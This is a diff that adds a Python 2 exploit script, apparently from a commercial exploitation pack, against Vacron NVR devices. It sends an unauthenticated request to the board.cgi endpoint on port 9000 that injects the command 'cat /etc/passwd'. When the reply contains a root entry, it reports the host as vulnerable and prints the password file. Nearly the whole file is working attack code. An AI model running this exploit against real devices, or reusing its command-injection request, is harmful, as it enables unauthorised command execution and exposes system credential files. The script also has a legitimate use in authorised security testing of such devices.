@@ -1,0 +1,42 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_vacron_1'
+_vendor_ = 'vacron'
+_model_  = ['NVR']
+_vuln_   = 'Remote Command Execution'
+_cve_    = ''
+_ref_    = 'https://blogs.securiteam.com/index.php/archives/3445'
+_port_   = 9000
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/board.cgi?cmd=cat%%20/etc/passwd' % (host,port)
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  elif ('error command' in response.text) or ('404 Not Found' in response.text):
+    print '[+] %s not vulnerable' % host  
+  elif ('root:$' in response.text):
+    print '[+] %s vulnerable' % host
+    print '[+] URL: %s\n'%url
+    print response.text
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
